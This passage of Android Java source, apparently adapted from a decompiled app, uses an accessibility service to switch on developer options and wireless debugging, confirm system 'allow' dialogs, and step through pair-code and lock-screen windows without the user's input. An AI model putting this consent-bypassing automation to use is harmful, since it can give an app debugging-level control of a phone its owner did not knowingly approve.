                    UiObject newScroll = f0();
                    if (newScroll != null) {
                        textNode = newScroll.findOneByOperateOr(b0());
                    }
                }

                if (textNode != null) {
                    Log.d("PairAccessibilityDelegate", "开发者选项栏目查找成功");
                    UiObject parent = textNode.parent();
                    AtomicInteger counter = new AtomicInteger(0);
                    UiObject checkable = null;
                    if (parent != null) {
                        try {
                            if (parent.checkable()) {
                                checkable = parent;
                            }
                        } catch (Exception ex) {
                            AppUtils.s("PairAccessibilityDelegate", ex);
                        }
                    }
                    CombineFilter switchFilter = Q0();
                    MyAccessibilityService.I(parent);
                    while (parent != null && checkable == null) {
                        if (counter.incrementAndGet() > 5) {
                            break;
                        }
                        checkable = parent.findOneByCombine(switchFilter);
                        parent = parent.parent();
                    }
                    switchNode = checkable;
                } else {
                    Log.e("PairAccessibilityDelegate", "开发者选项栏目查找失败");
                }
            }

            /* Toggle the switch */
            if (switchNode != null) {
                isChecked = switchNode.checked();
                wasClicked = !isChecked ? switchNode.clickPosition(0.95f, 0.5f) : false;
            }

            /* If clicked, wait for "允许开发设置" dialog */
            if (wasClicked) {
                AtomicInteger waitCounter = new AtomicInteger(10);
                boolean dialogFound = K();
                while (!dialogFound) {
                    try {
                        if (waitCounter.decrementAndGet() < 0) {
                            break;
                        }
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        dialogFound = K();
                    } catch (Exception ex) {
                        AppUtils.s("PairAccessibilityDelegate", ex);
                        break;
                    }
                }
                if (dialogFound) {
                    Log.d("PairAccessibilityDelegate", "开发者选项已点击,已弹出允许开发设置对话框");
                    UiObject okButton = k().findOneByCombine(U());
                    if (okButton != null && okButton.click()) {
                        Log.d("PairAccessibilityDelegate", "已点击允许打开开发者选项");
                        return true;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }

        if (isChecked) {
            Log.d("PairAccessibilityDelegate", "开发者选项已勾选");
            return true;
        }
        Log.e("PairAccessibilityDelegate", "开发者选项未勾选");
        return false;
    }

    /**
     * vendor g0(UiObject, int) — find Switch node and toggle it (with retries).
     * Similar to h0 but as an instance method. Used for checkbox toggling in y.java case 2.
     */
    public final CheckedResult g0(UiObject node, int unused) {
        boolean checked = false;
        AtomicInteger counter = new AtomicInteger(0);
        CheckedResult result = new CheckedResult();
        try {
            /* Determine if node itself is checkable */
            UiObject switchNode = null;
            if (node != null && node.checkable()) {
                switchNode = node;
            }

            /* Search upward for Switch */
            CombineFilter switchFilter = Q0();
            MyAccessibilityService.I(node);
            while (node != null && switchNode == null) {
                if (counter.incrementAndGet() > 3) {
                    break;
                }
                switchNode = node.findOneByCombine(switchFilter);
                node = node.parent();
            }

            if (switchNode == null) {
                result.setChecked(false);
                return result;
            }

            /* Check current state */
            checked = switchNode.checked();
            int retries = 20;

            /* Attempt 1: click switch directly */
            if (!checked) {
                if (switchNode.click()) {
                    result.setClicked(true);
                    switchNode.refresh();
                    checked = switchNode.checked();
                }
                /* Wait for checked state */
                while (retries > 0 && !checked) {
                    com.guard.wallet.utils.SystemHelper.T0(1);
                    switchNode.refresh();
                    checked = switchNode.checked();
                    retries--;
                }
            }

            /* Attempt 2: click parent clickable element */
            if (!checked) {
                UiObject clickableParent = switchNode.findParentUtilCombine(T());
                if (clickableParent != null && clickableParent.click()) {
                    result.setClicked(true);
                    switchNode.refresh();
                    checked = switchNode.checked();
                    /* Wait for checked state */
                    while (retries > 0 && !checked) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                        switchNode.refresh();
                        checked = switchNode.checked();
                        retries--;
                    }
                }
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
        result.setChecked(checked);
        return result;
    }

    // ═══════════════════════════════════════════════════════════════
    //  Main event handler — u(AccessibilityEvent, String, String)
    // ═══════════════════════════════════════════════════════════════

    /**
     * vendor u() — main accessibility event handler.
     * Dispatches events to appropriate handlers based on window state:
     *   - Developer options: dispatch pairInDevOption (y case 0/1)
     *   - Wireless debug window: dispatch pairInWifiDebugWindow (y case 4)
     *   - Pair code dialog: dispatch pairInPairCodeDialog (y case 5)
     *   - Pair fail dialog: dispatch pairInPairFailDialog (y case 6)
     *   - Lock screen: dispatch pairInConfirmLock (y case 7)
     *   - Security center: dispatch pairInSecurityCenter (y default)
     *   - Prepare finish: dispatch pairInPrepareFinish (y case 2)
     *   - Pair success: dispatch pairInPairSuccess (y case 3)
     */
    @Override
    public final void u(AccessibilityEvent event, String pkg, String cls) {
        try {
            if (this.r.get()) {
                return;
            }

            if (event != null) {
                super.u(event, pkg, cls);
            }

            Object pairSuccessState = EngineHelper.PAIR_DEPT_PAIR_SUCCESS;
            AtomicReference stateRef = this.p;
            ConcurrentLinkedQueue queue = this.o;
            String delegateId = this.c;

            // ADAPT: 仅在 Case 4 已点击 "使用配对码配对" 按钮后 (state=PAIR_CODE) 才检查 M()
            // 因为 M() 的 getRootInActiveWindow fallback 会在无线调试主页面也匹配到该文本
            if (stateRef.get() == EngineHelper.PAIR_DEPT_PAIR_CODE) {
                if (this.M() && !this.Q()) {
                    queue.remove("pairInWifiDebugWindow");
                    if (!queue.contains("pairInPairCodeDialog")) {
                        queue.add("pairInPairCodeDialog");
                        com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 5), delegateId);
                    }
                    return;
                }
            }

            // ADAPT: 先检查 P() (无线调试子页) 再检查 L() (开发者选项)
            /* Check wireless debug window */
            if (this.P()) {
                queue.remove("pairInDevOption");
                queue.remove("pairInPairCodeDialog");
                queue.remove("pairInConfirmLock");

                if (stateRef.get() == pairSuccessState) {
                    if (!queue.contains("pairInPairSuccess")) {
                        queue.add("pairInPairSuccess");
                        com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 3), delegateId);
                    }
                } else {
                    if (!queue.contains("pairInWifiDebugWindow")) {
                        queue.add("pairInWifiDebugWindow");
                        com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 4), delegateId);
                    }
                }
                return;
            }

            /* Check developer options window (AFTER P() to avoid SubSettings collision) */
            boolean inDevOptions = this.L();
            if (inDevOptions) {
                // ADAPT: 当 state=LEAVE_DEV_OPT 时，表示刚点击"无线调试"进入子页
                // ColorOS 16 的 accessibility events 在页面切换时仍报告旧窗口 class
                // 导致 L() 匹配但 P() 匹配不到。此时延迟 dispatch case 4
                if (stateRef.get() == EngineHelper.PAIR_DEPT_LEAVE_DEV_OPT) {
                    Log.e("PairAccessibilityDelegate", "state=LEAVE_DEV_OPT, 延迟 dispatch case 4 (无线调试子页)");
                    final PairAccessibilityDelegate self = this;
                    new Thread(() -> {
                        try {
                            Thread.sleep(2000);
                            // ADAPT: 用 getWindows 找到 SubSettings 窗口,刷新 activeRoot
                            // vendor 依赖 event 更新 k(),但 ColorOS 16 event 不更新窗口类名
                            com.guard.wallet.service.MyAccessibilityService svc = com.guard.wallet.service.MyAccessibilityService.P();
                            if (svc != null) {
                                java.util.List<android.view.accessibility.AccessibilityWindowInfo> windows = svc.getWindows();
                                if (windows != null) {
                                    for (android.view.accessibility.AccessibilityWindowInfo win : windows) {
                                        if (win == null || !win.isActive()) continue;
                                        android.view.accessibility.AccessibilityNodeInfo winRoot =
                                                android.os.Build.VERSION.SDK_INT >= 33
                                                ? com.guard.wallet.infra.WindowInfoCompat.getRootNode(win)
                                                : win.getRoot();
                                        if (winRoot != null) {
                                            self.F(new UiObject(winRoot, 0, 0));
                                            self.i.set(true);
                                            Log.e("PairAccessibilityDelegate", "activeRoot 已刷新到窗口: " + win.getTitle());
                                            break;
                                        }
                                    }
                                }
                            }
                            if (!queue.contains("pairInWifiDebugWindow")) {
                                queue.add("pairInWifiDebugWindow");
                                com.guard.wallet.thread.DelegateTaskLauncher.c(
                                        new com.guard.wallet.delegate.task.PairDelegateTask(self, 4), delegateId);
                            }
                        } catch (Exception ignored) {}
                    }).start();
                    return;
                }

                queue.remove("pairInWifiDebugWindow");
                queue.remove("pairInPairCodeDialog");
                queue.remove("pairInPairFailDialog");
                queue.remove("pairInConfirmLock");
                queue.remove("pairInSecurityCenter");

                if (stateRef.get() == EngineHelper.PAIR_DEPT_UNKNOWN) {
                    if (!queue.contains("pairInDevOption")) {
                        queue.add("pairInDevOption");
                        com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 0), delegateId);
                    }
                }

                if (stateRef.get() == EngineHelper.PAIR_DEPT_BACK_TO_DEV && !queue.contains("pairInDevOption")) {
                    stateRef.set(EngineHelper.PAIR_DEPT_UNKNOWN);
                    queue.add("pairInDevOption");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 1), delegateId);
                }

                if (stateRef.get() == pairSuccessState || stateRef.get() == EngineHelper.PAIR_DEPT_PAIR_DONE) {
                    if (!queue.contains("pairInPrepareFinish")) {
                        queue.add("pairInPrepareFinish");
                        com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 2), delegateId);
                    }
                }
                return;
            }

            /* Check "允许此网络无线调试" dialog (systemui) */
            boolean inWifiAllowDialog = false;
            try {
                LinkedList dialogList = new LinkedList();
                dialogList.add(J());
                dialogList.add(r0());
                if (q(dialogList)) {
                    Log.d("PairAccessibilityDelegate", "已进入是否允许此网络无线调试对话框");
                    inWifiAllowDialog = true;
                }
            } catch (Exception ex) {
                AppUtils.s("PairAccessibilityDelegate", ex);
            }

            if (inWifiAllowDialog) {
                queue.remove("pairInWifiDebugWindow");
                queue.remove("pairInDevOption");
                return;
            }

            /* Check pair code dialog */
            if (this.M() && !this.Q()) {
                queue.remove("pairInWifiDebugWindow");
                if (!queue.contains("pairInPairCodeDialog")) {
                    queue.add("pairInPairCodeDialog");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 5), delegateId);
                }
                return;
            }

            /* Check pair fail dialog */
            if (this.N()) {
                if (!queue.contains("pairInPairFailDialog")) {
                    queue.add("pairInPairFailDialog");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 6), delegateId);
                }
                return;
            }

            /* Check lock screen */
            boolean inLockScreen = false;
            try {
                if (q(EngineHelper.oiL())) {
                    Log.d("PairAccessibilityDelegate", "已进入锁屏密码验证窗口");
                    inLockScreen = true;
                }
            } catch (Exception ex) {
                AppUtils.s("PairAccessibilityDelegate", ex);
            }

            if (inLockScreen) {
                if (!queue.contains("pairInConfirmLock")) {
                    queue.add("pairInConfirmLock");
                    com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 7), delegateId);
                }
                return;
            }

            /* Check USB security center (Xiaomi) */
            if (this.O()) {
                com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.PairDelegateTask(this, 8), delegateId);
            }
        } catch (Exception ex) {
            AppUtils.s("PairAccessibilityDelegate", ex);
        }
    }
}
